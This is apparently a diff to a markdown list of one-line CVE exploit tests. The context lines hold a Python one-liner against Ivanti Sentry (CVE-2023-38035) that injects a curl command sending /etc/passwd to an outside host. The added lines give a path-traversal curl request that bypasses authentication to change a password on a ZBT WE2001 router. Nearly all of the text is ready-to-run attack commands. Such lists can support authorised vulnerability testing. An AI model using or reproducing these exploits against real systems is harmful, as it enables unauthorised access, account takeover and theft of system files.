@@ -35,3 +35,6 @@ One line vulnerability tests!
 
 ## CVE-2023-38035 (Ivanti Sentry API Authentication Bypass)
 `python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd https://x.x.x.x', 'isRoot': True}, None)"`
+
+## CVE-2025-64075 - Shenzhen Zhibotong Electronics ZBT WE2001 23.09.27 Authentcation bypass via path traversal 
+`curl --path-as-is -Liks "http://192.168.1.1/cgi-bin/webapi?op=change_password&access_token=../../../etc/hosts"`
